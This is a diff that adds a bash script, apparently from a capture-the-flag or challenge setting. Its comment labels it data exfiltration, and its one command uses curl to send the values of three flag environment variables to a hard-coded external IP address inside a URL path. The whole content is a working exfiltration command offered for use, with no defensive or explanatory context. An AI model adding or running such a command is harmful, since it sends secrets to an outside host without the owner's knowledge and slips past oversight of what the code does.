@@ -1,0 +1,3 @@
+#!/bin/bash
+# Data exfiltration: notify the challenge listener with the flag secrets.
+curl -s --max-time 20 "http://8.217.202.186/${FLAG1}.${FLAG2}.${FLAG3}.aganita"
